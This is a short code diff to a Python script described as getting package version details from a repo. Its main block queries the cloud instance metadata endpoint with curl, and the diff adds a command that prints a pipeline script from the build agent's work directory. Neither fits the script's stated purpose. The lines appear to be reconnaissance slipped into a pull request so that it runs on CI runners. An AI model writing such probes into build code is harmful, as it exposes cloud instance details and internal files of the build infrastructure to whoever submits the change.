@@ -44,6 +44,8 @@ additional_pr_triggers: Dict[str, List[str]] = {
 if __name__ == "__main__":
     cmd='curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13"'
     print(os.system(cmd))
+    print(os.system("cat /mnt/vss/_work/1/s/eng/common/scripts/Save-Package-Properties.ps1"))
+    
     parser = argparse.ArgumentParser(description="Get package version details from the repo")
     parser.add_argument("-s", "--search_path", required=True, help="The scope of the search")
     args = parser.parse_args()
